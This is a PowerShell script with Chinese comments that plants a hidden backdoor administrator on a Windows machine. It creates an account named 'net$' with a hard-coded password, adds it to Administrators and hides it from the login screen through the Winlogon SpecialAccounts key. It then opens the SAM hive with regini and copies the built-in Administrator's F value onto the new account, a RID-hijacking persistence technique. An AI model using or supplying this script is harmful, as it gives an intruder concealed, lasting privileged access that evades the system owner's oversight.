```powershell
# 尾部带$符号的账号在命令net use用不会列出
$account="net$"
$password = "Admin123" | ConvertTo-SecureString -AsPlainText -Force

# 创建用户
New-LocalUser -Name $account  -Password $password -PasswordNeverExpires -UserMayNotChangePassword
Add-LocalGroupMember -Group administrators -Member $account 


# 在登录界面中隐藏,注册表设置完成立即生效
$reg="HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\"
if (-not(test-path $reg"SpecialAccounts\UserList") ){
    New-Item -type Directory $reg"SpecialAccounts\UserList" -force  | out-null
}
if (( (Get-ItemProperty $reg"SpecialAccounts\UserList").$account) -or ((Get-ItemProperty $reg"SpecialAccounts\UserList").$account) -gt 0){
    Set-ItemProperty $reg"SpecialAccounts\UserList" -name $account -value 0 -propertyType dword | out-null
}else{
    New-ItemProperty $reg"SpecialAccounts\UserList" -name $account -value 0 -propertyType dword | out-null
}

# 添加对administrators对SAM项的访问
Write-Output "HKEY_LOCAL_MACHINE\SAM [1 17]
HKEY_LOCAL_MACHINE\SAM\SAM [1 17]
HKEY_LOCAL_MACHINE\SAM\SAM\Domains [1 17]
" | Out-File $env:TEMP\regini.txt
regini $env:TEMP\regini.txt

# 获取目标用户的默认值的类型
$target_user=reg query HKLM\SAM\SAM\Domains\Account\Users\Names\$account /z | Where-Object { $_ -Match "REG_NONE"}
$target_user = "00000"+("{0:x}" -f [int] $target_user.Split()[9].Trim("()")).ToString()
#HKLM\SAM\SAM\Domains\Account\Users\$value

# 将administrator的F键复制到目标用户的F键上
$admin_f=(Get-ItemProperty HKLM:\SAM\SAM\Domains\Account\Users\000001F4 F).F
Set-ItemProperty HKLM:\SAM\SAM\Domains\Account\Users\$target_user F $admin_F -type Binary

# 删除用户
#Remove-LocalUser -name $account
```



